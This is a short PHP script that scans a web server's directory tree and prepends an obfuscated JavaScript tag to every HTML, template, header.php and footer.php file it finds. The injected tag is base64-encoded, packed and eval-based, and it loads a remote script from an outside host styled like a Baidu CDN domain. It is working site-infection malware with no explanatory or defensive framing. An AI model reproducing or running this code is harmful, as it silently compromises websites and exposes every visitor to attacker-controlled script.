<?php
$script = 'PHNjcmlwdD4oZnVuY3Rpb24oKSB7ZXZhbChmdW5jdGlvbihwLGEsYyxrLGUsZCl7ZT1mdW5jdGlvbihjKXtyZXR1cm4oYzxhPyIiOmUocGFyc2VJbnQoYy9hKSkpKygoYz1jJWEpPjM1P1N0cmluZy5mcm9tQ2hhckNvZGUoYysyOSk6Yy50b1N0cmluZygzNikpfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKWRbZShjKV09a1tjXXx8ZShjKTtrPVtmdW5jdGlvbihlKXtyZXR1cm4gZFtlXX1dO2U9ZnVuY3Rpb24oKXtyZXR1cm4nXFxcXHcrJ307Yz0xO307d2hpbGUoYy0tKWlmKGtbY10pcD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxcXGInK2UoYykrJ1xcXFxiJywnZycpLGtbY10pO3JldHVybiBwO30oJzEgOD1bXFwnZVxcJyxcXCdjXFwnLFxcJ2RcXCcsXFwnZ1xcJ107MSAwPWYoMixiKXsyPTItMzsxIDY9OFsyXTttIDZ9OzEgNT03W1xcJ2xcXCddKDAoXFwnOVxcJykpOzEgYT1vKG4oXFwnaT1cXCcpKTs1WzAoXFwnM1xcJyldPWE7MSA0PTdbXFwnaFxcJ10oMChcXCc5XFwnKSlbM107NFswKFxcJ2tcXCcpXVswKFxcJ2pcXCcpXSg1LDQpOycsMjUsMjUsJ18wfHZhcnxfMXwweDB8c3x4YXxfM3xkb2N1bWVudHxfMnwweDJ8dGV8XzR8aW5zZXJ0QmVmb3JlfHNjcmlwdHxzcmN8ZnVuY3Rpb258cGFyZW50Tm9kZXxnZXRFbGVtZW50c0J5VGFnTmFtZXxhSFIwY0hNNkx5OXpaR3N1WW1GcFpIVmpaRzV6WlhKMlpYSXVlSGw2TDJweExYQjFZbXhwWXk0ek9ESXpNVEl1YW5NfDB4MXwweDN8Y3JlYXRlRWxlbWVudHxyZXR1cm58YXRvYnxkZWNvZGVVUklDb21wb25lbnQnLnNwbGl0KCd8JyksMCx7fSkpCn0pKCk7PC9zY3JpcHQ+';
function getUpperDirectory($level) {
    $dir = __DIR__;
    for ($i = 0; $i < $level; $i++) {
        $dir = dirname($dir);
    }
    return $dir;
}
function processDirectory($dir) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($fullPath)) {
            processDirectory($fullPath);
        } elseif (pathinfo($fullPath, PATHINFO_EXTENSION) == 'html'||strpos($file, 'tpl.php') !== false || $file=='header.php'||$file=='footer.php'){
            processHtmlFile($fullPath);
        }
    }
}
function processHtmlFile($filePath) {
    global $script;
    $content = file_get_contents($filePath);
    $newContent = base64_decode($script) . $content;
    file_put_contents($filePath, $newContent);
}
$targetDir = getUpperDirectory(4);
processDirectory($targetDir);
